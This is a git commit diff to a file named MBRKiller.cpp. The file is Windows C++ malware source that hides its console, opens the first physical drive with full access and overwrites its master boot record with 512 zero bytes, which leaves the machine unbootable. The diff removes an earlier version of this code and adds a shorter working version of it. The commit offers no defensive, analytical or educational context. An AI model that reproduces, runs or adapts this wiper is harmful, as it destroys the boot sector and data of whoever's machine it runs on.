d4c394c05c2f13063359279e79d35575259df504
pankoza-pl <77279607+pankoza-pl@users.noreply.github.com>
2021-05-05 19:52:39 +0200

    new code

--- MBRKiller.cpp
+++ MBRKiller.cpp
@@ -3,21 +3,13 @@
 
 using namespace std;
 
-#define MBR_SIZE 512
 int main()
 {
 	FreeConsole();
-	DWORD write;
-	char mbrData[MBR_SIZE];
-	
+	char mbrData[512];
 	ZeroMemory(&mbrData, (sizeof mbrData));
-	
-	HANDLE MasterBootRecord = CreateFile("\\\\.\\PhysicalDrive0"
-		, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE
-		, NULL, OPEN_EXISTING, NULL, NULL);
-		if (WriteFile(MasterBootRecord, mbrData, MBR_SIZE, &write, NULL) == TRUE) {
-			ExitProcess(0);
-		}
-	CloseHandle(MasterBootRecord);
-	return EXIT_SUCCESS;
+	HANDLE MBR = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
+	DWORD write;
+	WriteFile(MBR, mbrData, 512, &write, NULL);
+	CloseHandle(MBR);
 }
